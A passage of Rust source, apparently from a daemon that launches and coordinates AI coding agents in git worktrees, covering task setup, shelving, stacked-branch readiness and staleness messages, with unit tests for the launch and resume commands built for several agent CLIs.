            let name = Some("Setup").filter(|n| core.pane(n).is_none());
            let mut open = json!({ "type": "term", "from": pane, "tab": true, "cwd": folder.to_string_lossy(), "cmd": command, "wait": false });
            if let Some(name) = name {
                open["name"] = json!(name);
            }
            let this = Rc::downgrade(self);
            let by = who(args).map(String::from);
            return core.handle(json!({ "cmd": "open", "args": open }), move |reply| {
                if let Some(error) = failed(&reply) {
                    return responder.reply(Err(error));
                }
                if let Some(this) = this.upgrade() {
                    this.note(&pane, Change::new("setting up").by(by.as_deref()));
                }
                let tab = reply.get("pane").and_then(|p| string(p, "id")).unwrap_or("").to_string();
                responder.reply(Ok(Map::from_iter([("task".to_string(), json!(id)), ("pane".to_string(), json!(tab)), ("tab".to_string(), json!(tab))])))
            });
        }
        let then = match task_scripts::setup(&folder) {
            Some(Setup::Failed(_)) => Self::first_command(&entry),
            _ => entry.clone().resumable().command(None),
        };
        let Some(pane) = pane else {
            task_scripts::forget_setup(&folder);
            return self.prepare(Entry { held: None, ..entry }, None, who(args).map(String::from), Answer::To(responder));
        };
        task_scripts::forget_setup(&folder);
        let Some(command) = task.setup_command(&setup, scripts.timeout, Some(&then)) else { return responder.reply(Err(bad(format!("{} isn't a worktree", folder.display())))) };
        self.setting_up.borrow_mut().insert(pane.clone(), SettingUp { worktree: folder, timeout: scripts.timeout });
        let by = who(args).map(String::from);
        let this = Rc::downgrade(self);
        self.revive(&pane.clone(), Some(command), move |result| {
            if let Some(this) = this.upgrade() {
                match &result {
                    Ok(pane) => {
                        if this.entries.borrow().iter().any(|e| e.held.as_deref() == Some(pane.as_str())) {
                            this.restarted(pane);
                        }
                        this.note(pane, Change::new("started").by(by.as_deref()).with("setup", json!(true)));
                    }
                    Err(_) => {
                        this.setting_up.borrow_mut().remove(&pane);
                    }
                }
            }
            responder.reply(result.map(|pane| Map::from_iter([("task".to_string(), json!(id)), ("pane".to_string(), json!(pane))])))
        });
    }

    fn room(self: &Rc<Self>, entry: Entry, app: String, by: Option<String>, responder: Answer) {
        let Some(core) = self.core.upgrade() else { return responder.reply(Err(KmuxError::new("app_gone", "the daemon is stopping"))) };
        let this = Rc::downgrade(self);
        let weak = self.core.clone();
        core.handle(json!({ "cmd": "task", "args": { "action": "list", "app": app } }), move |reply| {
            let Some(this) = this.upgrade() else { return };
            if let Some(error) = failed(&reply) {
                return responder.reply(Err(error));
            }
            let here = project(Some(&entry.repo));
            let running = weak.upgrade().map_or(0, |core| {
                let ids: Vec<String> = reply.get("tasks").and_then(Value::as_array).map_or(vec![], |l| l.iter().filter_map(|t| string(t, "id").map(String::from)).collect());
                core.with_panes(|panes| ids.iter().filter_map(|id| panes.get(id)).filter(|p| project(p.cwd.as_deref()) == here).count())
            });
            if running >= TASKS_PER_PROJECT {
                return responder.reply(Err(KmuxError::new("task_limit", format!("{} has {TASKS_PER_PROJECT} tasks on the Desk: move one to the Shelf with `kanna task shelve TASK` first", entry.repo))));
            }
            this.prepare(entry, Some(app), by, responder);
        });
    }

    fn prepare(self: &Rc<Self>, mut entry: Entry, app: Option<String>, by: Option<String>, responder: Answer) {
        if let (Some(pane), Some(app)) = (entry.held.clone(), app.clone()) {
            return self.release(pane, entry, app, by, responder);
        }
        if let Some(folder) = entry.folder.clone() {
            if Path::new(&folder).is_dir() {
                return self.launch(Starting { entry: entry.resumable(), app, by, responder }, folder, None);
            }
            (entry.folder, entry.session) = (None, None);
        }
        if let Some(birth) = entry.birth.clone() {
            let me = self.machines().me.name;
            if !allowed(&entry.on, &me) {
                return responder.reply(Err(KmuxError::new("not_here", format!("{} runs on {}, not {me}", entry.id, entry.on.join(", ")))));
            }
            if self.ambiguous(&entry.id) {
                return responder.reply(Err(KmuxError::new("ambiguous", format!("{} can't start: another machine made a task with its ID at the same time; make it again with kanna task new", entry.id))));
            }
            if let Err(why) = Replica::start(&self.db, &entry.id, &birth) {
                return responder.reply(Err(KmuxError::new("not_owner", format!("{} can't start on this machine: {why}", entry.id))));
            }
            let mut replica = self.replica.borrow_mut();
            if let Err(error) = replica.write(&self.db, &entry.id, &birth, &[("state", json!("started"))]).and_then(|_| replica.ran(&self.db, &entry.id, &birth)) {
                log!("kanna-daemon: couldn't save that {} started: {error}", entry.id);
            }
            self.sync_at.set(Instant::now());
        }
        let token = self.next.get() + 1;
        self.next.set(token);
        let name = match self.taken_from(&entry) {
            true => format!("{}-{}", entry.id, self.machines().me.name.chars().map(|c| if c.is_ascii_alphanumeric() { c.to_ascii_lowercase() } else { '-' }).collect::<String>()),
            false => entry.id.clone(),
        };
        let (repo, events, bases) = (PathBuf::from(&entry.repo), self.events.clone(), self.stack_of(&entry));
        self.pending.borrow_mut().insert(token, Starting { entry, app, by, responder });
        std::thread::spawn(move || {
            let result = stacks::make(&repo, &name, bases);
            let _ = events.send(Event::Worktree { token, result });
        });
    }

    fn taken_from(&self, entry: &Entry) -> bool {
        let replica = self.replica.borrow();
        let field = format!("{}{}", replica::RUN, replica.me());
        entry.birth.as_deref().and_then(|birth| replica.record(&entry.id, birth)).is_some_and(|r| r.get(&field)["from"].is_string())
    }

    pub fn worktree_made(self: &Rc<Self>, token: u64, result: Result<Made, String>) {
        let Some(mut starting) = self.pending.borrow_mut().remove(&token) else { return };
        match result {
            Ok(Made::Worktree { folder, branch, bases }) => {
                (starting.entry.bases, starting.entry.conflict) = (bases, None);
                self.launch(starting, folder, Some(branch))
            }
            Ok(Made::Conflict(why)) => {
                let heads = self.stack_of(&starting.entry).into_iter().map(|b| b.head).collect();
                let id = starting.entry.id.clone();
                let conflict = Conflict { heads, why: why.clone() };
                self.alter(&id, Change::new("conflict").by(Some("daemon")).with("why", json!(why)), |e| e.conflict = Some(conflict.clone()));
                self.changed();
                log!("kanna-daemon: {id} stays blocked: {why}");
                starting.responder.reply(Err(KmuxError::new("conflict", format!("{} stays blocked: {why}", self.short(&id)))))
            }
            Err(error) => starting.responder.reply(Err(KmuxError::new("failed", format!("couldn't make {}'s worktree: {error}", starting.entry.id)))),
        }
    }

    fn record(&self, pane: &str, entry: Entry, place: Place) {
        let mut running = self.running.borrow_mut();
        running.retain(|r| r.pane != pane);
        running.push(Running { pane: pane.to_string(), entry, place });
    }

    /// Move to Shelf: takes a running task off its Desk and puts it back on its repo's Shelf,
    /// its agent and tabs still running, so starting it again brings them back as they are.
    fn shelve(self: &Rc<Self>, args: &Value, responder: Responder) {
        let Some(core) = self.core.upgrade() else { return responder.reply(Err(KmuxError::new("app_gone", "the daemon is stopping"))) };
        let Some(reference) = string(args, "task") else { return responder.reply(Err(bad("say which running task"))) };
        let Some(pane) = core.pane(&self.pane_or(reference)) else { return responder.reply(Err(KmuxError::new("not_found", format!("no running task \"{reference}\"")))) };
        let recorded = self.running.borrow().iter().find(|r| r.pane == pane.id).map(|r| (r.entry.clone(), r.place));
        let Some((entry, from)) = recorded else { return responder.reply(Err(KmuxError::new("not_found", format!("no running task \"{reference}\"")))) };
        let by = who(args).map(String::from);
        let this = Rc::downgrade(self);
        let id = pane.id.clone();
        core.handle(json!({ "cmd": "task", "args": { "action": "hold", "task": id } }), move |reply| {
            let Some(this) = this.upgrade() else { return };
            if let Some(error) = failed(&reply) {
                return responder.reply(Err(error));
            }
            this.running.borrow_mut().retain(|r| r.pane != id);
            let entry = Entry { held: Some(id.clone()), ..entry };
            let change = Change { from: Some(from), to: Some(Place::Shelf), ..Change::new("shelved") }.by(by.as_deref());
            let saved = this.store(&entry, Place::Shelf, Some(&id), Some(change));
            this.tell_planner(&entry, What::Shelved, by.as_deref());
            let value = entry.to_value();
            insert_in_order(&mut this.entries.borrow_mut(), entry);
            this.changed();
            if let Err(error) = saved {
                return responder.reply(Err(error));
            }
            let running = this.core.upgrade().is_some_and(|core| alive(&core, &id));
            responder.reply(Ok(Map::from_iter([("task".to_string(), value), ("pane".to_string(), json!(id)), ("running".to_string(), json!(running))])));
        });
    }

    fn launch(self: &Rc<Self>, starting: Starting, folder: String, branch: Option<String>) {
        let Some(core) = self.core.upgrade() else { return starting.responder.reply(Err(KmuxError::new("app_gone", "the daemon is stopping"))) };
        let Starting { entry, app, by, responder } = starting;
        self.launching.borrow_mut().insert(entry.id.clone());
        let name = entry.name.clone().filter(|n| core.pane(n).is_none());
        let session = (agent(&entry.agent).is_some_and(|a| a.named.is_some()) && entry.folder.is_none()).then(uuid).and_then(Result::ok);
        let first = entry.command(session.as_deref());
        let setup = self.setup_first(&entry, Path::new(&folder), &first);
        let mut args = json!({ "type": "term", "dock": "left", "frozen": true, "task": entry.id, "cwd": folder, "cmd": setup.as_ref().map_or(first, |(command, _)| command.clone()), "wait": false });
        if let Some(name) = &name {
            args["name"] = json!(name);
        }
        match &app {
            Some(app) => args["claim"] = json!(app),
            None => args["shelf"] = json!(true),
        }
        let this = Rc::downgrade(self);
        let weak = self.core.clone();
        core.handle(json!({ "cmd": "open", "args": args }), move |reply| {
            let Some(this) = this.upgrade() else { return };
            this.launching.borrow_mut().remove(&entry.id);
            if let Some(error) = failed(&reply) {
                return responder.reply(Err(error));
            }
            let pane = reply.get("pane").and_then(|p| string(p, "id")).unwrap_or("").to_string();
            if let Some((_, setting)) = setup {
                this.setting_up.borrow_mut().insert(pane.clone(), setting);
            }
            let mut ran = entry.clone();
            ran.workspace = reply.get("workspace").and_then(|w| string(w, "id")).map(String::from).or(ran.workspace);
            ran.folder = Some(folder.clone());
            ran.session = ran.session.or(session);
            let renamed = this.entries.borrow().iter().find(|e| e.id == ran.id).map(|e| e.name.clone()).filter(|now| *now != ran.name);
            if let Some(core) = weak.upgrade() {
                core.set_command(&pane, ran.command(None));
                if let Some(Some(now)) = &renamed {
                    core.handle(json!({ "cmd": "rename-pane", "args": { "pane": pane, "name": now } }), |_| {});
                }
            }
            if let Some(now) = renamed {
                ran.name = now;
            }
            let out = Self::reply_out(&ran.id, &pane, Some(&folder), app.as_deref());
            let published = match &app {
                Some(app) => this.started(&pane, ran, app, by.as_deref()),
                None => this.running_here(&pane, ran, by.as_deref()),
            };
            this.with_branch(published.map(|_| out), &folder, branch, responder);
        });
    }

    /// Brings a task held on the Shelf back to the Desk, its agent and tabs as they were, or starts it again
    /// in its worktree when its agent's pane is gone.
    fn release(self: &Rc<Self>, pane: String, entry: Entry, app: String, by: Option<String>, responder: Answer) {
        let Some(core) = self.core.upgrade() else { return responder.reply(Err(KmuxError::new("app_gone", "the daemon is stopping"))) };
        let this = Rc::downgrade(self);
        let weak = self.core.clone();
        core.handle(json!({ "cmd": "task", "args": { "action": "claim", "task": pane, "app": app } }), move |reply| {
            let Some(this) = this.upgrade() else { return };
            if let Some(error) = failed(&reply) {
                if weak.upgrade().is_some_and(|core| core.pane(&pane).is_some()) {
                    return responder.reply(Err(error));
                }
                return this.prepare(Entry { held: None, ..entry }, Some(app), by, responder);
            }
            let entry = Entry { held: None, ..entry };
            let folder = entry.folder.clone().unwrap_or_default();
            let live = weak.upgrade().is_some_and(|core| alive(&core, &pane));
            let command = (!live).then(|| this.again(&entry));
            let entry = if live { entry } else { entry.resumable() };
            let id = entry.id.clone();
            let picked = this.started(&pane, entry, &app, by.as_deref());
            let Some(command) = command else {
                return this.with_branch(picked.map(|_| Self::reply_out(&id, &pane, Some(&folder), Some(&app))), &folder, None, responder);
            };
            log!("kanna-daemon: {id} is on {app}'s Desk, and its agent and tabs start");
            let again = Rc::downgrade(&this);
            this.after_this_turn(move || {
                let Some(this) = again.upgrade() else { return responder.reply(Err(gone())) };
                let again = Rc::downgrade(&this);
                this.revive(&pane.clone(), Some(command), move |result| {
                    let Some(this) = again.upgrade() else { return };
                    match &result {
                        Ok(_) => log!("kanna-daemon: {id}'s agent and tabs started"),
                        Err(error) => log!("kanna-daemon: {id} is on the Desk, but its agent didn't start: {}", error.message),
                    }
                    let out = picked.and(result).map(|pane| Self::reply_out(&id, &pane, Some(&folder), Some(&app)));
                    this.with_branch(out, &folder, None, responder);
                });
            });
        });
    }

    fn reply_out(id: &str, pane: &str, folder: Option<&str>, app: Option<&str>) -> Map {
        let mut out = Map::from_iter([("task".to_string(), json!(id)), ("pane".to_string(), json!(pane)), ("folder".to_string(), json!(folder))]);
        match app {
            Some(app) => out.insert("app".to_string(), json!(app)),
            None => out.insert("place".to_string(), json!(Place::Shelf.as_str())),
        };
        out
    }

    fn with_branch(&self, out: Result<Map, KmuxError>, folder: &str, branch: Option<String>, responder: Answer) {
        let mut out = match out {
            Ok(out) => out,
            Err(error) => return responder.reply(Err(error)),
        };
        if let Some(branch) = branch {
            out.insert("branch".to_string(), json!(branch));
            return responder.reply(Ok(out));
        }
        self.branch_of(folder, move |branch| {
            out.insert("branch".to_string(), json!(branch));
            responder.reply(Ok(out))
        });
    }

    fn branch_of(&self, folder: &str, then: impl FnOnce(String) + 'static) {
        let token = self.next.get() + 1;
        self.next.set(token);
        self.branching.borrow_mut().insert(token, Box::new(then));
        let (folder, events) = (PathBuf::from(folder), self.events.clone());
        std::thread::spawn(move || {
            let branch = git(&folder, &["branch", "--show-current"]).unwrap_or_default();
            let _ = events.send(Event::Branch { token, branch });
        });
    }

    fn after_this_turn(&self, then: impl FnOnce() + 'static) {
        let token = self.next.get() + 1;
        self.next.set(token);
        self.turns_away.borrow_mut().insert(token, Box::new(then));
        let _ = self.events.send(Event::Turn { token });
    }

    pub fn next_turn(&self, token: u64) {
        let then = self.turns_away.borrow_mut().remove(&token);
        if let Some(then) = then {
            then()
        }
    }

    pub fn branch_found(&self, token: u64, branch: String) {
        let then = self.branching.borrow_mut().remove(&token);
        if let Some(then) = then {
            then(branch)
        }
    }

    fn running_here(&self, pane: &str, ran: Entry, by: Option<&str>) -> Result<(), KmuxError> {
        let entry = Entry { held: Some(pane.to_string()), stopped: None, ..ran };
        self.turns.borrow_mut().insert(pane.to_string(), Turn::default());
        let saved = self.store(&entry, Place::Shelf, Some(pane), Some(Change::new("started").by(by)));
        if let Some(found) = self.entries.borrow_mut().iter_mut().find(|e| e.id == entry.id) {
            *found = entry;
        }
        self.changed();
        saved
    }

    fn started(&self, pane: &str, ran: Entry, app: &str, by: Option<&str>) -> Result<(), KmuxError> {
        self.take(&ran.id);
        self.turns.borrow_mut().remove(pane);
        self.quitting.borrow_mut().remove(pane);
        let ran = Entry { stopped: None, ..ran };
        let saved = self.store(&ran, Place::Desk, Some(pane), Some(Change::new("picked").moved(Place::Shelf, Place::Desk).by(by).with("app", json!(app))));
        self.tell_planner(&ran, What::Picked, by);
        self.record(pane, ran, Place::Desk);
        self.changed();
        saved
    }
}

impl Tasks {
    fn alter(&self, id: &str, change: Change, edit: impl Fn(&mut Entry)) -> Option<Entry> {
        let shelf = self.entries.borrow_mut().iter_mut().find(|e| e.id == id).map(|e| {
            edit(e);
            (e.clone(), Place::Shelf, e.held.clone())
        });
        let found = shelf.or_else(|| {
            self.running.borrow_mut().iter_mut().find(|r| r.entry.id == id).map(|r| {
                edit(&mut r.entry);
                (r.entry.clone(), r.place, Some(r.pane.clone()))
            })
        });
        let (entry, place, pane) = found?;
        let _ = self.store(&entry, place, pane.as_deref(), Some(change));
        Some(entry)
    }

    fn tell(&self, id: &str, text: String) {
        let Some(entry) = self.open_tasks().into_iter().find(|e| e.id == id) else { return };
        match self.db.put_message(id, &entry.repo, KANNA, &text, Some(messages::PROMPTING)) {
            Ok(message) => {
                log!("kanna-daemon: a message from {KANNA} waits for {id}");
                self.waiting.borrow_mut().push(message);
                self.refill();
            }
            Err(error) => log!("kanna-daemon: couldn't save {KANNA}'s message for {id} in {}: {error}", db::FILE),
        }
    }

    fn where_of(&self, base: &Base) -> Where {
        match self.open_tasks().into_iter().find(|e| e.id == base.id).and_then(|e| e.folder) {
            Some(folder) => Where::Folder(PathBuf::from(folder)),
            None => Where::Branch(self.known(&base.id).and_then(|e| e.ready).map(|m| m.branch).filter(|b| !b.is_empty()).unwrap_or_else(|| base.branch.clone())),
        }
    }

    fn merge_target(&self, id: &str) -> String {
        let known = self.known(id);
        let ready = known.as_ref().and_then(|e| e.ready.clone()).unwrap_or_default();
        let now = known.as_ref().and_then(|e| stacks::head(Path::new(&e.repo), &self.where_of(&Base { id: id.to_string(), branch: ready.branch.clone(), head: String::new() })));
        let head = now.or(Some(ready.head));
        head.filter(|h| !h.is_empty() && h.bytes().all(|b| b.is_ascii_hexdigit())).unwrap_or_else(|| self.branch_name(id))
    }

    fn branch_name(&self, id: &str) -> String {
        let known = self.known(id);
        let ready = known.as_ref().and_then(|e| e.ready.as_ref()).map(|m| m.branch.clone()).filter(|b| !b.is_empty());
        ready.or_else(|| known.and_then(|e| e.folder).and_then(|f| git(Path::new(&f), &["branch", "--show-current"]).ok())).filter(|b| b.bytes().all(|c| c.is_ascii_alphanumeric() || b"._/-".contains(&c))).unwrap_or_else(|| id.to_string())
    }

    fn stack_fields(&self, entry: &Entry, value: &mut Value) {
        let named = |id: &str| json!({ "id": id, "name": opt(self.known(id).and_then(|e| e.name).as_deref()) });
        value["ready"] = entry.ready.as_ref().map_or(Value::Null, Mark::to_value);
        value["stale"] = Value::Array(entry.stale.iter().map(|id| named(id)).collect());
        value["bases"] = Value::Array(entry.bases.iter().map(|b| {
            let mut base = named(&b.id);
            base["branch"] = json!(b.branch);
            base["head"] = json!(b.head);
            base
        }).collect());
        value["conflict"] = opt(self.conflicted(entry).as_deref());
    }

    fn mark(&self, args: &Value) -> Result<Map, KmuxError> {
        let reference = string(args, "task").ok_or_else(|| bad("say which task"))?;
        let id = self.resolve(reference)?.ok_or_else(|| not_found(reference))?;
        let entry = self.open_tasks().into_iter().find(|e| e.id == id).ok_or_else(|| KmuxError::new("done", format!("{} is done", self.short(&id))))?;
        let folder = entry.folder.clone().map(PathBuf::from).filter(|f| f.is_dir()).ok_or_else(|| KmuxError::new("not_started", format!("{} hasn't started, so it has no work to be ready", self.short(&id))))?;
        let unread = |error: String| KmuxError::new("failed", format!("couldn't read {}'s worktree: {error}", self.short(&id)));
        if stacks::dirty(&folder).map_err(unread)? {
            return Err(KmuxError::new("dirty", format!("{} has uncommitted changes: commit them first, so the tasks built on it get them", self.short(&id))));
        }
        let head = git(&folder, &["rev-parse", "HEAD"]).map_err(unread)?;
        let branch = git(&folder, &["branch", "--show-current"]).unwrap_or_default();
        let repo = PathBuf::from(&entry.repo);
        let open = self.open_tasks();
        let mut bases = vec![];
        for base in &entry.bases {
            let now = stacks::head(&repo, &self.where_of(base)).unwrap_or_else(|| base.head.clone());
            if stacks::in_main(&repo, &now) {
                bases.push(base.clone());
                continue;
            }
            if open.iter().any(|e| e.id == base.id && !e.stale.is_empty()) {
                return Err(KmuxError::new("stale", format!("{} is stale itself: it catches up first, and you get a message when it's ready again", self.label(&base.id))));
            }
            if !stacks::contains(&repo, &now, &head) {
                return Err(KmuxError::new("behind", format!("{} isn't in this branch yet: merge it first (git merge {now}), rerun the tests, then mark it ready", self.label(&base.id))));
            }
            bases.push(Base { head: now, branch: self.branch_name(&base.id), ..base.clone() });
        }
        let blocked: Vec<Entry> = open.iter().filter(|e| e.folder.is_none() && self.waits(e).contains(&id)).cloned().collect();
        let mark = Mark { head: head.clone(), branch: branch.clone(), at: now() };
        let change = Change::new("ready").by(who(args)).with("head", json!(head)).with("branch", json!(branch));
        let entry = self.alter(&id, change, |e| {
            e.ready = Some(mark.clone());
            e.stale.clear();
            e.bases = bases.clone();
        }).ok_or_else(|| not_found(reference))?;
        log!("kanna-daemon: {id} is ready at {head}");
        let behind: Vec<String> = self.open_tasks().into_iter().filter(|e| !e.stale.is_empty() && e.bases.iter().any(|b| b.id == id)).map(|e| e.id).collect();
        for task in behind {
            self.tell(&task, format!("{} is ready again: merge it into your branch (git merge {head}), rerun the tests, then run `kanna task ready set`.", self.label(&id)));
        }
        let freed: Vec<Value> = blocked.iter().filter_map(|e| self.known(&e.id)).filter(|e| self.waits(e).is_empty()).map(|e| json!({ "id": e.id, "name": opt(e.name.as_deref()) })).collect();
        self.changed();
        self.refill();
        Ok(Map::from_iter([("task".to_string(), self.described(&entry)), ("freed".to_string(), Value::Array(freed))]))
    }

    fn unmark(&self, args: &Value) -> Result<Map, KmuxError> {
        let reference = string(args, "task").ok_or_else(|| bad("say which task"))?;
        let id = self.resolve(reference)?.ok_or_else(|| not_found(reference))?;
        let entry = self.open_tasks().into_iter().find(|e| e.id == id).ok_or_else(|| KmuxError::new("done", format!("{} is done", self.short(&id))))?;
        let entry = match entry.ready {
            None => entry,
            Some(_) => self.alter(&id, Change::new("unready").by(who(args)).with("why", json!("cleared")), |e| e.ready = None).ok_or_else(|| not_found(reference))?,
        };
        self.changed();
        Ok(Map::from_iter([("task".to_string(), self.described(&entry))]))
    }

    fn follow(&self) {
        let repos: HashSet<PathBuf> = self.probes().into_iter().map(|p| p.repo).collect();
        if *self.following.borrow() == repos {
            return;
        }
        self.following.replace(repos.clone());
        let mut heads = self.heads.borrow_mut();
        let to = heads.get_or_insert_with(|| stacks::follow_heads(self.events.clone()));
        let _ = to.send(stacks::Heads::Repos(repos));
    }

    pub fn heads_moved(&self) {
        self.watch();
    }

    fn watch(&self) {
        if self.watching.get() {
            self.again.set(true);
            return;
        }
        let probes = self.probes();
        if probes.is_empty() {
            return;
        }
        self.watching.set(true);
        let events = self.events.clone();
        std::thread::spawn(move || {
            let _ = events.send(Event::Stacks { seen: stacks::look(probes) });
        });
    }

    fn probes(&self) -> Vec<stacks::Probe> {
        self.open_tasks()
            .into_iter()
            .filter(|e| e.ready.is_some() || !e.bases.is_empty())
            .filter_map(|e| {
                let folder = e.folder.clone()?;
                Some(stacks::Probe { id: e.id.clone(), repo: PathBuf::from(&e.repo), at: Where::Folder(PathBuf::from(folder)), bases: e.bases.iter().map(|b| (b.clone(), self.where_of(b))).collect() })
            })
            .collect()
    }

    pub fn watched(&self, seen: Vec<stacks::Seen>) {
        self.watching.set(false);
        self.settle(seen);
        if self.again.replace(false) {
            self.watch();
        }
    }

    fn settle(&self, seen: Vec<stacks::Seen>) {
        let tasks: Vec<stacks::Task> = self.open_tasks().into_iter().map(|e| stacks::Task { id: e.id, ready: e.ready, bases: e.bases, stale: e.stale }).collect();
        let steps = stacks::settle(&tasks, &seen);
        if steps.is_empty() {
            return;
        }
        for step in steps {
            match step {
                Step::Unready { id } => {
                    log!("kanna-daemon: {id}'s branch moved, so it isn't ready");
                    self.alter(&id, Change::new("unready").by(Some("daemon")).with("why", json!("moved")), |e| e.ready = None);
                }
                Step::Merged { id, base, main } => {
                    log!("kanna-daemon: {base}'s work is in main, so {id} isn't stacked on it");
                    let Some(left) = self.alter(&id, Change::new("base merged").by(Some("daemon")).with("base", json!(base)), |e| e.bases.retain(|b| b.id != base)) else { continue };
                    let main = main.unwrap_or_else(|| "main".into());
                    let rest = match left.bases.is_empty() {
                        true => format!(" Nothing you build on is outside {main} now: you're an ordinary task again, and can merge into {main} once you're done."),
                        false => format!(" You still merge after {}.", left.bases.iter().map(|b| self.label(&b.id)).collect::<Vec<_>>().join(", ")),
                    };
                    self.tell(&id, format!("{}'s work is in {main} now: merge {main} into your branch (git merge {main}).{rest}", self.label(&base)));
                }
                Step::Stale { id, behind, waiting } => {
                    log!("kanna-daemon: {id} is stale: behind {behind:?}, on stale {waiting:?}");
                    let all: Vec<String> = behind.iter().chain(waiting.iter()).cloned().collect();
                    self.alter(&id, Change::new("stale").by(Some("daemon")).with("behind", json!(all)), |e| {
                        e.ready = None;
                        e.stale = all.clone();
                    });
                    let mut said = vec![];
                    if !behind.is_empty() {
                        let names: Vec<String> = behind.iter().map(|b| self.label(b)).collect();
                        let merges: Vec<String> = behind.iter().map(|b| format!("git merge {}", self.merge_target(b))).collect();
                        said.push(format!("{} moved since this task was built on it, so this task is stale: merge it into your branch ({}), rerun the tests, then run `kanna task ready set`.", names.join(", "), merges.join("; ")));
                    }
                    if !waiting.is_empty() {
                        let names: Vec<String> = waiting.iter().map(|b| self.label(b)).collect();
                        said.push(format!("{} is stale, so this task is too: what it builds on moved. Wait for it: you get a message when it's ready again; then merge its branch, rerun the tests and run `kanna task ready set`.", names.join(", ")));
                    }
                    self.tell(&id, said.join(" "));
                }
            }
        }
        self.changed();
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn said(word: &str) -> String {
        let out = Command::new("/bin/sh").arg("-c").arg(format!("printf %s {word}")).env("KANNA_TERMINAL", "term-9").output().unwrap();
        String::from_utf8(out.stdout).unwrap()
    }

    #[test]
    fn a_task_s_agent_is_told_it_s_a_task_s_agent_ahead_of_its_first_message() {
        let mut entry = Entry { id: "task-1dfb12c2".into(), name: None, message: Some("don't stop".into()), repo: "/r".into(), by: None, made_at: 0.0, agent: "codex".into(), folder: None, session: None, held: None, ..Default::default() };
        let command = entry.command_with(None, Prompts::Skip);
        assert_eq!(said(command.strip_prefix("codex --yolo --no-daemon ").unwrap()), "You're a task's agent in Kanna (terminal term-9), in your task's worktree. Your task: don't stop");
        entry.message = None;
        let command = entry.command_with(None, Prompts::Skip);
        assert_eq!(said(command.strip_prefix("codex --yolo --no-daemon ").unwrap()), "You're a task's agent in Kanna (terminal term-9), in your task's worktree.");
    }

    #[test]
    fn a_claude_task_gets_a_session_and_resumes_it_when_it_comes_back_from_the_shelf() {
        let mut entry = Entry { id: "task-1dfb12c2".into(), name: None, message: Some("go".into()), repo: "/r".into(), by: None, made_at: 0.0, agent: "/bin/claude".into(), folder: None, session: None, held: None, ..Default::default() };
        let id = uuid().unwrap();
        assert!(id.len() == 36 && id.chars().nth(14) == Some('4'), "{id}");
        assert_eq!(entry.command_with(Some(&id), Prompts::Skip), format!("/bin/claude --dangerously-skip-permissions --session-id {id} {}", told_task(Some("go"))));
        entry.folder = Some("/r/.kanna-worktrees/task-0000c0de".into());
        assert_eq!(entry.command_with(None, Prompts::Skip), "/bin/claude --dangerously-skip-permissions --continue", "a task Kanna didn't start resumes the folder's latest session");
        entry.session = Some(id.clone());
        assert_eq!(entry.command_with(None, Prompts::Skip), format!("/bin/claude --dangerously-skip-permissions --resume '{id}'"));
    }

    fn started(agent: &str) -> Entry {
        Entry { id: "task-1dfb12c2".into(), name: None, message: Some("go".into()), repo: "/r".into(), by: None, made_at: 0.0, agent: agent.into(), folder: None, session: None, held: None, ..Default::default() }
    }

    #[test]
    fn a_codex_task_resumes_its_own_session_and_the_latest_only_until_it_s_found() {
        let mut entry = started("codex");
        assert_eq!(entry.command_with(Some("u"), Prompts::Skip), format!("codex --yolo --no-daemon {}", told_task(Some("go"))), "codex can't be given a session ID");
        entry.folder = Some("/r/.kanna-worktrees/task-0000c0de".into());
        assert_eq!(entry.command_with(None, Prompts::Skip), "codex --yolo --no-daemon resume --last");
        entry.session = Some("01a13ca7-c348-70f2-82e8-f27af07b17f5".into());
        assert_eq!(entry.command_with(None, Prompts::Skip), "codex --yolo --no-daemon resume '01a13ca7-c348-70f2-82e8-f27af07b17f5'");
    }

    #[test]
    fn codex_sessions_are_found_by_worktree_newest_first() {
        let dir = std::env::temp_dir().join(format!("kanna-codex-sessions-{}", std::process::id()));
        let (here, there, sessions) = (dir.join("here"), dir.join("there"), dir.join("sessions"));
        fs::create_dir_all(&here).unwrap();
        for (day, at, id, cwd) in [("2026/09/30", "2026-09-30T23-00-00", "old", &here), ("2026/10/02", "2026-10-02T08-00-00", "new", &here), ("2026/10/02", "2026-10-02T09-00-00", "other", &there)] {
            fs::create_dir_all(sessions.join(day)).unwrap();
            let meta = json!({ "timestamp": at, "type": "session_meta", "payload": { "id": id, "cwd": cwd, "base_instructions": { "text": "x".repeat(50_000) } } });
            fs::write(sessions.join(day).join(format!("rollout-{at}-{id}.jsonl")), format!("{meta}\n{{\"type\":\"event_msg\"}}\n")).unwrap();
        }
        fs::write(sessions.join("2026/10/02/notes.txt"), "").unwrap();
        assert_eq!(latest_codex_session(&sessions, &here, None), Some("new".into()));
        assert_eq!(latest_codex_session(&sessions, &there, None), Some("other".into()));
        assert_eq!(latest_codex_session(&sessions, &dir.join("nowhere"), None), None);
        let later = SystemTime::now() + Duration::from_secs(60);
        assert_eq!(latest_codex_session(&sessions, &here, Some(later)), None, "a session older than the worktree isn't its");
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn an_opencode_task_resumes_the_session_found_for_its_worktree() {
        let mut entry = started("opencode");
        assert_eq!(entry.command_with(Some("u"), Prompts::Skip), format!("opencode --prompt {}", told_task(Some("go"))));
        entry.folder = Some("/r/.kanna-worktrees/task-0000c0de".into());
        assert_eq!(entry.command_with(None, Prompts::Skip), format!("opencode --prompt {}", told_task(Some("go"))));
        entry.session = Some("ses_1".into());
        assert_eq!(entry.command_with(None, Prompts::Skip), "opencode --session 'ses_1'");
    }

    #[test]
    fn an_antigravity_task_continues_its_worktree_s_conversation() {
        let mut entry = started("/usr/local/bin/agy");
        assert_eq!(entry.command_with(Some("u"), Prompts::Skip), format!("/usr/local/bin/agy --dangerously-skip-permissions -i {}", told_task(Some("go"))));
        entry.folder = Some("/r/.kanna-worktrees/task-0000c0de".into());
        assert_eq!(entry.command_with(None, Prompts::Skip), "/usr/local/bin/agy --dangerously-skip-permissions --continue");
        entry.session = Some("c1".into());
        assert_eq!(entry.command_with(None, Prompts::Skip), "/usr/local/bin/agy --dangerously-skip-permissions --conversation 'c1'");
    }

    #[test]
    fn an_agent_kanna_doesn_t_know_starts_again_with_its_first_message() {
        let mut entry = started("aider");
        entry.folder = Some("/r/.kanna-worktrees/task-0000c0de".into());
        assert_eq!(entry.command_with(Some("u"), Prompts::Skip), format!("aider {}", told_task(Some("go"))));
    }

    #[test]
    fn a_task_s_agent_asks_permission_unless_you_said_to_skip_it() {
        let mut entry = started("/bin/claude");
        assert_eq!(entry.command_with(Some("u"), Prompts::Ask), format!("/bin/claude --session-id u {}", told_task(Some("go"))));
